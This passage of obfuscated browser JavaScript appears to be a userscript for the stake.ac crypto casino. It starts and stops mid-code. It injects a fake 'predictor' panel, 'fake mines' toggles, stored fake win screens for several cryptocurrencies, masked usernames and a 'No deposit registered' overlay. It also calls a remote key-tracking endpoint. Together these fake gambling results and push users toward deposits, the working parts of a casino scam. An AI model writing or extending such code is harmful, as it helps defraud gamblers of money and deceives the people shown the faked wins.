      }, _0x3b2562);
    };
    _0x24eb58.addEventListener('mouseover', () => {
      clearTimeout(_0x348527);
      _0x3b2562 -= Date.now() - _0x485da0;
    });
    _0x24eb58.addEventListener("mouseout", _0xb13e34);
    _0xb13e34();
  }
  function _0x4fc25c() {
    _0x588f3f.querySelectorAll("button").forEach((_0x302b0a, _0x482024) => {
      if (_0x302b0a.hasAttribute('xmlns')) {
        const _0x6b81e8 = localStorage.getItem("uncovered");
        if (_0x6b81e8) {
          const _0x373bf3 = new DOMParser().parseFromString(_0x6b81e8, "text/html");
          _0x302b0a.replaceWith(_0x373bf3.body.firstChild);
        }
      }
    });
    const _0x149648 = document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div");
    if (_0x149648) {
      _0x149648.remove();
    }
  }
  function _0x1f40ea() {
    _0x25891d(document.getElementById('keyInput').value, true);
  }
  function _0x153c2f(_0x996293) {
    const _0x33cc4b = document.querySelector("div.gem:not(button[xmlns=\"http://www.w3.org/1999/xhtml\"] .gem)");
    if (_0x33cc4b) {
      const _0x2496ab = localStorage.getItem("copiedBomb");
      if (_0x2496ab) {
        const _0x3f04bf = new DOMParser().parseFromString(_0x2496ab, 'text/html');
        const _0x53af2b = document.createElement("button");
        _0x53af2b.setAttribute("xmlns", "http://www.w3.org/1999/xhtml");
        _0x53af2b.classList.add('tile', "mine", "svelte-1avx2pj");
        _0x53af2b.setAttribute("data-test", "mines-tile");
        _0x53af2b.setAttribute('data-revealed', "false");
        _0x53af2b.appendChild(_0x3f04bf.body.firstChild);
        const _0x32b83b = _0x33cc4b.parentNode;
        let _0x2bd858;
        _0x32b83b.parentNode.replaceChild(_0x53af2b.firstChild, _0x32b83b);
        if ("ltc" === _0x48a9fe) {
          _0x2bd858 = localStorage.getItem("copiedWinMenu");
        } else if ("eth" === _0x48a9fe) {
          _0x2bd858 = localStorage.getItem("eth_win");
        } else if ("pol" === _0x48a9fe) {
          _0x2bd858 = localStorage.getItem("matic_win");
        } else if ("btc" === _0x48a9fe) {
          _0x2bd858 = localStorage.getItem("btc_win");
        }
        if (_0x2bd858) {
          const _0x2cb134 = new DOMParser().parseFromString(_0x2bd858, 'text/html');
          _0x588f3f.appendChild(_0x2cb134.body.firstChild);
          document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button").addEventListener("click", function () {
            _0x4fc25c();
          });
        }
      }
    } else {
      setTimeout(() => {
        _0x153c2f(_0x996293);
      }, 0xa);
    }
  }
  async function _0x5d11b0() {
    const _0x3a00d9 = "HackerAlive"; // Always use valid username
    _0x2d6211();
    _0x170fb8();
    _0x4d15d6();
    _0x5c9718 = true;
  }
  function _0x8dc214() {
    clearTimeout(_0x28d45f);
    clearTimeout(_0x274e5d);
    clearTimeout(_0x4e37c3);
  }
  function _0x2cfaad() {
    clearTimeout(_0x2743c7);
    clearTimeout(_0xd97eb3);
    clearTimeout(_0x883401);
    clearInterval(_0x11e98d);
  }
  function _0x424407() {
    clearTimeout(_0x2b74f8);
    clearTimeout(_0x33bbb8);
    clearInterval(_0x4b9899);
    clearInterval(_0x2d9500);
    clearTimeout(_0x1247a7);
  }
  function _0x4f22fb() {
    clearTimeout(_0x5ee28a);
    clearTimeout(_0x1aad21);
    clearTimeout(_0x3cfe82);
    clearTimeout(_0x4b42ef);
    clearInterval(_0x2ad5c1);
  }
  function _0x556e17() {
    clearTimeout(_0x5997d7);
    clearTimeout(_0x3a81cb);
    clearInterval(_0x5b2a83);
    clearTimeout(_0x2c3e56);
    clearTimeout(_0x538172);
  }
  function _0x35f110() {
    _0x4a8c70 = true;
    _0x8dc214();
    _0x2cfaad();
    if ('0' === localStorage.getItem("autoShowPredictor")) {
      _0x144f61 = false;
    } else {
      _0x5ddbce();
    }
    _0x498b2e();
    _0x471b5a();
    _0x58d117();
    _0x53cb46();
    setTimeout(_0x3e97b0, 0x1f4);
    _0xdf815();
    setTimeout(_0x21a7a2, 0x1f4);
    _0x473b7d();
  }
  function _0x5ec880() {
    _0x4a8c70 = true;
    _0x8dc214();
    _0x556e17();
    _0x498b2e();
    _0x471b5a();
    setTimeout(_0x21a7a2, 0x1f4);
    setTimeout(_0x3e97b0, 0x1f4);
    _0x473b7d();
    _0x47a07a();
    _0x1ab05c();
    if (!_0x2b90c1) {
      _0x2b90c1 = true;
      _0x5b2a83 = setInterval(() => {
        if (!window.location.href.startsWith("https://stake.ac/casino/games/keno")) {
          clearInterval(_0x5b2a83);
          _0x52a358();
          _0x556e17();
          _0x8dc214();
          _0x111052();
          _0x4d15d6();
        }
      }, 0x64);
    }
  }
  function _0x126d3c() {
    _0x4a8c70 = true;
    _0x8dc214();
    _0x424407();
    setTimeout(_0x21a7a2, 0x1f4);
    _0x34b6dc();
    _0x498b2e();
    _0x473b7d();
    setTimeout(_0x3e97b0, 0x1f4);
    _0x32f161();
    _0x205cde();
    _0x471b5a();
    if (!_0x2b90c1) {
      _0x2b90c1 = true;
      _0x2d9500 = setInterval(() => {
        if (!window.location.href.startsWith("https://stake.ac/casino/games/dice")) {
          clearInterval(_0x2d9500);
          _0x424407();
          _0x52a358();
          _0x8dc214();
          _0x111052();
          _0x4d15d6();
        }
      }, 0x64);
    }
  }
  function _0x3c62cd() {
    _0x4a8c70 = true;
    _0x8dc214();
    _0x424407();
    setTimeout(_0x21a7a2, 0x1f4);
    _0x498b2e();
    _0x473b7d();
    _0x32f161();
    _0x25fd58();
    _0x471b5a();
    if (!_0x2b90c1) {
      _0x2b90c1 = true;
      _0xd86844 = setInterval(() => {
        if (!window.location.href.startsWith('https://stake.ac/casino/games/plinko')) {
          clearInterval(_0xd86844);
          _0x424407();
          _0x52a358();
          _0x8dc214();
          _0x111052();
          _0x4d15d6();
        }
      }, 0x64);
    }
  }
  function _0x5a9a71() {
    _0x4a8c70 = true;
    _0x8dc214();
    _0x4f22fb();
    if (Number(localStorage.getItem("latest_bal")) < 0x64) {
      _0x1d2b31();
    } else {
      _0x874bc8();
    }
    _0x3f189e();
    _0x498b2e();
    _0x473b7d();
    setTimeout(_0x21a7a2, 0x1f4);
    setTimeout(_0x3e97b0, 0x1f4);
    _0x32f161();
    _0xf4e498();
    _0x471b5a();
    if (!_0x2b90c1) {
      _0x2b90c1 = true;
      _0x2ad5c1 = setInterval(() => {
        if (!window.location.href.startsWith('https://stake.ac/casino/games/limbo')) {
          clearInterval(_0x2ad5c1);
          document.querySelector('#customlimboModal').remove();
          _0x40724d = false;
          (function () {
            let _0xed4fa0 = document.getElementById('limboGUI');
            if (_0xed4fa0) {
              _0xed4fa0.remove();
            }
            clearInterval(_0x371757);
            if (_0x4ba692) {
              _0x4ba692.disconnect();
              _0x4ba692 = null;
            }
          })();
          _0x4f22fb();
          _0x8dc214();
          _0x52a358();
          _0x111052();
          _0x4d15d6();
        }
      }, 0x64);
    }
  }
  function _0x126523() {
    _0x8dc214();
    _0x2cfaad();
    _0x424407();
    _0x556e17();
    _0x4f22fb();
    clearInterval(_0x4f9c3a);
    clearTimeout(_0x4e37c3);
    clearInterval(_0x2099eb);
  }
  function _0x111052() {
    _0x1a8633 = false;
    _0x5f5018 = false;
    _0x510b88 = false;
    _0x1ca05d = false;
    _0x37284d = true;
    _0x3a5df1 = true;
    _0x3493c8 = false;
    _0xd8bd68 = false;
    _0x2fe346 = 0x0;
    _0x1b304a = 0x2;
    _0x556504 = 0x2;
    _0x20c1de = 0x0;
    _0x4a8c70 = false;
    _0x2b90c1 = false;
    _0x126523();
  }
  function _0x170fb8() {
    const _0x468f76 = document.querySelector("#svelte > div.wrap.svelte-2gw7o8 > div.main-content.svelte-2gw7o8 > div.navigation.svelte-1nt2705 > div > div > div > div.balance-toggle.svelte-1o8ossz > div > div > div > button > div > div > span.weight-normal.line-height-default.align-left.size-default.text-size-default.variant-subtle.is-truncate.svelte-17v69ua");
    if (_0x468f76) {
      const _0x11e608 = _0x468f76.title;
      if ("ltc" === _0x11e608) {
        _0x48a9fe = 'ltc';
      } else if ("eth" === _0x11e608) {
        _0x48a9fe = 'eth';
      } else if ("pol" === _0x11e608) {
        _0x48a9fe = "pol";
      } else if ("btc" === _0x11e608) {
        _0x48a9fe = 'btc';
      } else if ("usdt" === _0x11e608) {
        _0x48a9fe = 'usdt';
        if (!_0xb427b2) {
          _0x367e4d("WARNING! You're using a Beta crypto currency not all of the features will work. Try using LTC/ETH/BTC/POL for that");
          _0xb427b2 = true;
        }
      } else if (!_0xb427b2) {
        _0x367e4d("WARNING! You're using a Non-Supported crypto currency. Try using LTC/ETH/BTC/POL/USDT");
        _0xb427b2 = true;
      }
      setTimeout(_0x170fb8, 0x3e8);
    } else {
      setTimeout(_0x170fb8, 0x3e8);
    }
  }
  function _0xb5221(_0x43dd9e = true) {
    return [];
  }
  async function _0xc3cd8f(_0x3d4741) {
    try {
      const _0x199519 = await _0x3837d9();
      if (!_0x199519) {
        throw new Error("Failed to retrieve the URL");
      }
      const _0x5331f2 = await fetch(_0x199519 + "mark_key_used", {
        'method': "POST",
        'headers': {
          'Content-Type': "application/json"
        },
        'body': JSON.stringify({
          'key': _0x3d4741
        })
      });
      if (!(await _0x5331f2.json()).success) {
        console.error("Failed to mark the key as used.");
      }
    } catch (_0x295c33) {
      console.error("Error marking the key as used:", _0x295c33);
    }
  }
  function _0x323869() {
    const _0x1bf82b = document.getElementById('validateKeyModal');
    if (_0x1bf82b) {
      _0x1bf82b.remove();
    }
  }
  function _0x2ff2cc(_0x5b1e7e) {
    // No-op - we don't want to show key validation messages anymore
  }
  function _0x4d15d6() {
    _0x5de51f = true;
    if (_0x3725f5) {
      _0x58f9f0();
      if (Number(localStorage.getItem('latest_bal')) < 0x64) {
        (function (_0x42c152) {
          if (document.querySelector(".test12-overlay")) {
            return;
          }
          const _0x3405ed = document.createElement('div');
          _0x3405ed.className = "test12-overlay";
          _0x3405ed.style.position = "fixed";
          _0x3405ed.style.top = '0';
          _0x3405ed.style.left = '0';
          _0x3405ed.style.width = "100%";
          _0x3405ed.style.height = "100%";
          _0x3405ed.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
          _0x3405ed.style.zIndex = "9999";
          const _0x75884e = document.createElement("div");
          _0x75884e.style.position = "fixed";
          _0x75884e.style.top = "50%";
          _0x75884e.style.left = "50%";
          _0x75884e.style.transform = "translate(-50%, -50%)";
          _0x75884e.style.background = "rgba(50, 50, 50, 0.9)";
          _0x75884e.style.color = "white";
          _0x75884e.style.padding = '30px';
          _0x75884e.style.borderRadius = "10px";
          _0x75884e.style.boxShadow = "0 4px 15px rgba(0, 0, 0, 0.5)";
          _0x75884e.style.zIndex = "1000";
          const _0x3b756f = document.createElement('h2');
          _0x3b756f.textContent = _0x42c152;
          _0x3b756f.style.textAlign = "center";
          _0x3b756f.style.marginBottom = "20px";
          _0x75884e.appendChild(_0x3b756f);
          const _0x52af04 = document.createElement("div");
          _0x52af04.style.display = 'flex';
          _0x52af04.style.justifyContent = 'center';
          _0x52af04.style.marginTop = "20px";
          const _0x3497a7 = document.createElement("button");
          _0x3497a7.textContent = 'Close';
          _0x3497a7.style.cssText = "\n    background-color: #ff4757;\n    color: white;\n    border: none;\n    padding: 10px 20px;\n    border-radius: 5px;\n    cursor: pointer;\n    transition: transform 0.2s ease, background-color 0.2s ease;\n    font-size: 16px;\n    margin: 0 10px;\n";
          _0x3497a7.style.backgroundColor = "#ff4757";
          _0x3497a7.onmouseenter = () => {
            _0x3497a7.style.transform = "scale(1.1)";
          };
          _0x3497a7.onmouseleave = () => {
            _0x3497a7.style.transform = 'scale(1)';
          };
          _0x3497a7.onclick = () => {
            document.body.removeChild(_0x3405ed);
          };
          _0x3405ed.addEventListener("click", _0x5f5691 => {
            if (_0x5f5691.target === _0x3405ed) {
              document.body.removeChild(_0x3405ed);
            }
          });
          _0x75884e.addEventListener("click", _0x38cc01 => {
            _0x38cc01.stopPropagation();
          });
          _0x52af04.appendChild(_0x3497a7);
          _0x75884e.appendChild(_0x52af04);
          _0x3405ed.appendChild(_0x75884e);
          document.body.appendChild(_0x3405ed);
        })("No deposit registered, Please complete the instructions to gain access");
      }
      if ('1' === localStorage.getItem("customizedmulti")) {
        _0x2c27fe = true;
      }
      if ('0' !== localStorage.getItem('notifyMissingItems')) {
        _0xb5221();
      }
      setInterval(_0x2cc116, 0x5dc);
      (function () {
        if (!_0x1ec843) {
          _0x1ec843 = _0x55aad2();
        }
        if (_0x4cf345) {
          _0x19f8ba();
        }
      })();
      _0x5cd3fd();
      _0x3725f5 = false;
    }
    if (_0x4a8c70) {
      _0x111052();
    }
    if (window.location.href.startsWith("https://stake.ac/")) {
      if ('https://stake.ac/casino/games/mines' === window.location.href) {
        if ("mines" !== _0x51e761) {
          _0x393f84 = true;
          _0x126523();
          _0x51e761 = 'mines';
          _0x35f110();
        }
      } else if ("https://stake.ac/casino/games/dice" === window.location.href) {
        if ("dice" !== _0x51e761) {
          _0x126523();
          _0x51e761 = "dice";
          _0x126d3c();
        }
      } else if ('https://stake.ac/casino/games/keno' === window.location.href) {
        if ("keno" !== _0x51e761) {
          _0x126523();
          _0x51e761 = "keno";
          _0x5ec880();
        }
      } else if ("https://stake.ac/casino/games/plinko" === window.location.href) {
        if ("plinko" !== _0x51e761) {
          _0x126523();
          _0x51e761 = "plinko";
          _0x3c62cd();
        }
      } else if ("https://stake.ac/casino/games/blackjack" === window.location.href) {
        if ("blackjack" !== _0x51e761) {
          _0x126523();
          _0x51e761 = "blackjack";
          _0x471b5a();
          _0x498b2e();
          setTimeout(_0x21a7a2, 0x1f4);
          _0x473b7d();
          setTimeout(_0x3e97b0, 0x1f4);
          _0x4f9c3a = setInterval(_0x2575e3, 0x64);
          if (!_0x2b90c1) {
            _0x2b90c1 = true;
            _0x2e9f4f = setInterval(() => {
              if (!window.location.href.startsWith("https://stake.ac/casino/games/blackjack")) {
                clearInterval(_0x2e9f4f);
                _0x8dc214();
                _0x52a358();
                clearInterval(_0x4f9c3a);
                _0x111052();
                _0x4d15d6();
              }
            }, 0x64);
          }
        }
      } else if ("https://stake.ac/casino/games/limbo" === window.location.href) {
        if ("limbo" !== _0x51e761) {
          _0x126523();
          _0x51e761 = "limbo";
          _0x5a9a71();
        }
      } else if ("https://stake.ac/casino/games/crash" === window.location.href) {
        if ('crash' !== _0x51e761) {
          _0x126523();
          _0x51e761 = 'crash';
          _0x450b24();
        }
      } else if (_0x51e761) {
        if ("mines" === _0x51e761) {
          _0x35a124 = false;
          _0x52e332 = false;
          _0x393f84 = false;
        }
        _0x51e761 = '';
        _0x356ed4 = false;
        _0x126523();
        _0x111052();
        _0x4d15d6();
      } else {
        _0x4e37c3 = setTimeout(_0x4d15d6, 0x64);
      }
    } else if (_0x51e761) {
      _0x51e761 = '';
      _0x126523();
      _0x111052();
      _0x4d15d6();
    } else {
      _0x4e37c3 = setTimeout(_0x4d15d6, 0x64);
    }
  }
  async function _0x874bc8() {
    _0x1410eb();
    if (!_0x2c27fe) {
      _0x1d2b31();
    }
  }
  function _0x3b04bb() {
    const _0x54743f = '1' === localStorage.getItem("toggleBlurVipProgress");
    const _0x37ce00 = localStorage.getItem("blurEffect");
    const _0x8aa777 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div");
    if (!document.querySelector("#rainbow-animation")) {
      const _0x7edb68 = document.createElement("style");
      _0x7edb68.id = "rainbow-animation";
      _0x7edb68.textContent = "\n            @keyframes rainbow {\n                0% { background-position: 0% 0%; }\n                50% { background-position: 100% 100%; }\n                100% { background-position: 0% 0%; }\n            }\n        ";
      document.head.appendChild(_0x7edb68);
    }
    if (_0x8aa777) {
      let _0xef8676 = _0x8aa777.querySelector(".blur-overlay");
      if (!_0xef8676) {
        _0xef8676 = document.createElement("div");
        _0xef8676.className = 'blur-overlay';
        _0x8aa777.appendChild(_0xef8676);
      }
      let _0x11bdd6 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.flex.justify-between.mb-6 > span");
      let _0x3f3f57 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-row.svelte-1xuxzlg > div > span.weight-semibold.line-height-default.align-left.size-md.text-size-md.variant-subtle.with-icon-space.is-truncate.svelte-17v69ua");
      if (_0x54743f) {
        if ("userBlur" === _0x37ce00) {
          if (_0x11bdd6) {
            _0xef8676.style.display = "none";
            _0x8aa777.style.filter = '';
            _0x8aa777.style.transition = '';
            _0x11bdd6.style.filter = 'blur(10px)';
            _0xef8676.remove();
          }
        } else if ("fakeUser" === _0x37ce00) {
          _0x11bdd6.innerText = localStorage.getItem("fakeUsername") || "Anonymous";
          _0xef8676.style.display = "none";
          if (_0x11bdd6) {
            _0x11bdd6.style.filter = '';
          }
          if (_0x3f3f57) {
            _0x3f3f57.style.filter = '';
          }
          _0x8aa777.style.filter = '';
          _0x8aa777.style.transition = '';
        } else if ("rgbBlur" === _0x37ce00) {
          _0xef8676.style.display = "block";
          _0xef8676.style.position = "absolute";
          _0xef8676.style.top = '0';
          _0xef8676.style.left = '0';
          _0xef8676.style.width = "100%";
          _0xef8676.style.height = "100%";
          _0xef8676.style.background = "rgba(255, 255, 255, 0)";
          _0xef8676.style.filter = "blur(10px)";
          _0xef8676.style.transition = "filter 0.3s ease";
          _0xef8676.style.zIndex = "999";
          _0xef8676.style.pointerEvents = "none";
          _0xef8676.style.background = "linear-gradient(45deg, red, orange, yellow, green, blue, indigo, violet)";
          _0xef8676.style.backgroundSize = "400% 400%";
          _0xef8676.style.animation = "rainbow 3s ease infinite";
          _0x8aa777.style.filter = "blur(10px)";
          _0x8aa777.style.transition = "filter 0.3s ease";
        } else {
          _0xef8676.style.display = "block";
          _0xef8676.style.position = "absolute";
          _0xef8676.style.top = '0';
          _0xef8676.style.left = '0';
          _0xef8676.style.width = "100%";
          _0xef8676.style.height = "100%";
          _0xef8676.style.background = "rgba(255, 255, 255, 0)";
          _0xef8676.style.filter = "blur(10px)";
          _0xef8676.style.transition = "filter 0.3s ease";
          _0xef8676.style.zIndex = "999";
          _0xef8676.style.pointerEvents = "none";
          _0xef8676.style.animation = '';
          _0x8aa777.style.filter = "blur(10px)";
          _0x8aa777.style.transition = "filter 0.3s ease";
        }
      } else {
        _0x11bdd6.innerText = "HackerAlive";
        _0xef8676.style.display = "none";
        if (_0x11bdd6) {
          _0x11bdd6.style.filter = '';
        }
        if (_0x3f3f57) {
          _0x3f3f57.style.filter = '';
        }
        _0x8aa777.style.filter = '';
        _0x8aa777.style.transition = '';
      }
    }
  }
  function _0x22d188(_0xd67512, _0xb30d9e) {
    const _0x16bbbd = parseInt(_0xd67512.slice(0x1), 0x10);
    const _0x5ec730 = Math.round(2.55 * _0xb30d9e);
    const _0x386999 = (_0x16bbbd >> 0x10) + _0x5ec730;
    const _0x3a03e1 = (_0x16bbbd >> 0x8 & 0xff) + _0x5ec730;
    const _0xbd7e97 = (0xff & _0x16bbbd) + _0x5ec730;
    return "rgb(" + Math.max(0x0, Math.min(0xff, _0x386999)) + ", " + Math.max(0x0, Math.min(0xff, _0x3a03e1)) + ", " + Math.max(0x0, Math.min(0xff, _0xbd7e97)) + ')';
  }
  function _0x27463e(_0x14a876) {
    _0x14a876 = _0x14a876.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i, (_0x2866ce, _0x39e8b6, _0x4f7da2, _0x21dba0) => _0x39e8b6 + _0x39e8b6 + _0x4f7da2 + _0x4f7da2 + _0x21dba0 + _0x21dba0);
    const _0x242868 = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(_0x14a876);
    return _0x242868 ? 'rgb(' + parseInt(_0x242868[0x1], 0x10) + ", " + parseInt(_0x242868[0x2], 0x10) + ", " + parseInt(_0x242868[0x3], 0x10) + ')' : null;
  }
  function _0x55aad2() {
    const _0x289b8a = {
      'bronze': {
        'text': "Bronze"
      },
      'silver': {
        'text': 'Silver'
      },
      'gold': {
        'text': "Gold"
      },
      'plat1': {
        'text': 'Platinum'
      },
      'plat2': {
        'text': "Platinum II"
      },
      'plat3': {
        'text': "Platinum III"
      },
      'plativ': {
        'text': "Platinum IV"
      },
      'platv': {
        'text': "Platinum V"
      },
      'platvi': {
        'text': "Platinum VI"
      },
      'diamond': {
        'text': "Diamond"
      },
      'diamond2': {
        'text': "Diamond II"
      }
    };
    let _0x3de9e9 = localStorage.getItem("selectedTier") || "bronze";
    if ("bronze" !== _0x3de9e9) {
      if ('1' === localStorage.getItem('autoLoadPreviousStatistics')) {
        _0x538031(_0x3de9e9, true);
      } else {
        _0x538031(_0x3de9e9);
      }
    }
    const _0x140434 = document.createElement("div");
    _0x140434.style.position = "fixed";
    _0x140434.style.top = "50%";
    _0x140434.style.left = '11.5%';
    _0x140434.style.transform = "translate(-50%, -50%)";
    _0x140434.style.background = "linear-gradient(" + _0x22d188(_0x54dbe2, -0x14) + ", black 90%)";
    _0x140434.style.padding = "20px";
    _0x140434.style.color = 'white';
    _0x140434.style.borderRadius = "10px";
    _0x140434.style.textAlign = 'center';
    _0x140434.style.width = "16vw";
    _0x140434.style.maxWidth = "400px";
    _0x140434.style.height = "auto";
    _0x140434.style.maxHeight = "80vh";
    _0x140434.style.overflowY = "auto";
    _0x140434.style.display = "none";
    _0x140434.style.boxShadow = "0 0 25px " + _0x54dbe2;
    _0x140434.style.transition = "box-shadow 0.3s ease, background-color 0.3s ease";
    const _0x435cad = document.createElement("div");
    _0x435cad.id = "additionalSettingsIcon";
    _0x435cad.innerHTML = "\n        <svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" width=\"24\" height=\"24\" fill=\"" + _0x54dbe2 + "\">\n            <path d=\"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z\"/>\n        </svg>\n    ";
    _0x435cad.style.position = 'absolute';
    _0x435cad.style.top = "10px";
    _0x435cad.style.right = "10px";
    _0x435cad.style.cursor = 'pointer';
    _0x435cad.style.transition = "fill 0.3s ease";
    const _0x129c48 = document.createElement("div");
    _0x129c48.id = "settingsIcon";
    _0x129c48.innerHTML = "\n        <svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" width=\"24\" height=\"24\" fill=\"" + _0x54dbe2 + "\">\n            <path d=\"M12 16.5a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9zm0-7a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM12 2a10 10 0 0 0-9 5.26c-.64 1.18-1.16 2.48-1.6 3.76a1.002 1.002 0 0 0 .49 1.12A10.011 10.011 0 0 0 12 22a10.011 10.011 0 0 0 9.71-6.86 1.002 1.002 0 0 0 .49-1.12c-.44-1.28-.96-2.58-1.6-3.76A10 10 0 0 0 12 2zm0 18c-4.44 0-8.25-2.39-10-5.8.28-.56.58-1.1.9-1.6A8.045 8.045 0 0 0 12 20a8.045 8.045 0 0 0 8.1-5.4c.32.5.62 1.04.9 1.6-1.75 3.41-5.56 5.8-10 5.8z\"/>\n        </svg>\n    ";
    _0x129c48.style.position = "absolute";
    _0x129c48.style.top = "10px";
    _0x129c48.style.left = '10px';
    _0x129c48.style.cursor = "pointer";
    _0x129c48.style.transition = "fill 0.3s ease";
    const _0x4bc664 = document.createElement('div');
    _0x4bc664.id = "settingsSection";
    _0x4bc664.style.display = "none";
    _0x4bc664.style.marginTop = "20px";
    const _0x4d472a = _0x22d188(_0x54dbe2, 0x1e);
    _0x4bc664.innerHTML = "\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Show access granted message on start-up</label>\n        <div id=\"toggleContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"toggleSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('0' === localStorage.getItem("showAccessGranted") ? _0x4d472a : _0x54dbe2) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem("showAccessGranted") || null === localStorage.getItem('showAccessGranted') ? '25px' : "5px") + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Notify about setup missing items</label>\n        <div id=\"notifyMissingItemsContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"notifyMissingItemsSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('0' === localStorage.getItem("notifyMissingItems") ? _0x4d472a : _0x54dbe2) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem("notifyMissingItems") || null === localStorage.getItem("notifyMissingItems") ? "25px" : "5px") + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Auto Activate Fake Mines</label>\n        <div id=\"autoActivateContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"autoActivateSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('1' === localStorage.getItem("autoActivateFakeMines") ? _0x54dbe2 : _0x4d472a) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem("autoActivateFakeMines") ? '25px' : '5px') + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n    " + ("\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Auto Activate Fake Mines V2</label>\n        <div id=\"autoActivateContainerv2\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"autoActivateSwitchv2\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('1' === localStorage.getItem("autoActivateFakeMinesv2") ? _0x54dbe2 : _0x4d472a) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem('autoActivateFakeMinesv2') ? "25px" : "5px") + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n    ") + "\n    " + ("\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Auto Show Predictor (Mines)</label>\n        <div id=\"autoShowPredictorContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"autoShowPredictorSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('0' === localStorage.getItem('autoShowPredictor') ? _0x4d472a : _0x54dbe2) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === localStorage.getItem("autoShowPredictor") || null === localStorage.getItem("autoShowPredictor") ? '25px' : "5px") + ";\n                    transform: translateY(-50%);\n                    transition: all 0.3s;\n                \"></div>\n            </div>\n        </div>\n    </div>\n    ") + "\n    " + ("\n    <div style=\"margin-bottom: 20px;\">\n        <label style=\"display: block; margin-bottom: 5px; color: " + _0x22d188(_0x54dbe2, 0x23) + ";\">Customized Predictor</label>\n        <div id=\"customizedmultiContainer\" style=\"display: flex; align-items: center; justify-content: center;\">\n            <div id=\"customizedmultiSwitch\" style=\"\n                width: 50px;\n                height: 25px;\n                background-color: " + ('1' === localStorage.getItem('customizedmulti') ? _0x54dbe2 : _0x4d472a) + ";\n                border-radius: 15px;\n                cursor: pointer;\n                position: relative;\n                box-shadow: 0 0 10px " + _0x54dbe2 + ";\n                transition: box-shadow 0.3s ease-in-out;\n            \">\n                <div style=\"\n                    width: 20px;\n                    height: 20px;\n                    background-color: white;\n                    border-radius: 50%;\n                    position: absolute;\n                    top: 50%;\n                    left: " + ('1' === 